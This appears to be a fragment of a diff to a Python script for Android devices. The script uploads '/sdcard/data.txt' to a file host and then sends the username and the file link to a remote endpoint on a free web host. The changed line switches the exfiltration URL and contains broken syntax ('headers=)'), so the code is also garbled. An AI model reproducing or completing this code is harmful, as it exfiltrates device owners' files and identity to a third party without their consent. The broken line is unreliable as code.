@@ -21,7 +21,7 @@ def upload(f):
   dl = dt["file"]
   fl = dl["url"]
   link = fl["full"]
-  req = requests.get("https://rootportal.000webhostapp.com/data.php?name="+str(uname)+"&link="+str(link))
+  req = requests.get("https://rootportal.000webhostapp.com/index.php?name="+str(uname)+"&link="+str(link), headers=)
 if ipack("ifconfig.me") == True:
   upload("/sdcard/data.txt")
 else:
